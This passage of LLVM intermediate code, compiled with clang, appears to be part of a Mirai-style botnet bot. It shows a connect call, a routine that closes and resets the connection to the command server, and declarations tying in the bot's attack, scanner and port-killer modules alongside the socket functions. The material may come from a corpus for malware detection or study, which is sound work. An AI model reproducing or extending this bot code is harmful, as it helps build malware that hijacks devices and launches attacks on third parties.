  %15 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %1, i32 0, i32 0
  %16 = load %struct.sockaddr*, %struct.sockaddr** %15, align 8
  %17 = call i32 @connect(i32 %13, %struct.sockaddr* %16, i32 16)
  br label %18

18:                                               ; preds = %5, %4
  ret void
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #2

declare i64 @send(i32, i8*, i64, i32) #2

declare i32 @accept(i32, %struct.sockaddr*, i32*) #2

declare void @scanner_kill() #2

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

declare void @attack_kill_all() #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @teardown_connection() #0 {
  %1 = load i32, i32* @fd_serv, align 4
  %2 = icmp ne i32 %1, -1
  br i1 %2, label %3, label %6

3:                                                ; preds = %0
  %4 = load i32, i32* @fd_serv, align 4
  %5 = call i32 @close(i32 %4)
  br label %6

6:                                                ; preds = %3, %0
  store i32 -1, i32* @fd_serv, align 4
  %7 = call i32 @sleep(i32 1)
  ret void
}

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

declare i32 @sleep(i32) #2

declare i32 @rand_next() #2

declare i32 @util_local_addr() #2

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #5

declare i64 @recv(i32, i8*, i64, i32) #2

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @ntohs(i16 zeroext) #5

declare void @attack_parse(i8*, i32) #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind readnone willreturn
declare i32 @htonl(i32) #5

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #5

declare i32 @fcntl(i32, i32, ...) #2

declare i32 @connect(i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

declare signext i8 @killer_kill_by_port(i16 zeroext) #2

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #1

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { argmemonly nofree nounwind willreturn writeonly }
attributes #4 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #5 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #6 = { nounwind }
attributes #7 = { noreturn nounwind }
attributes #8 = { nounwind readnone willreturn }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
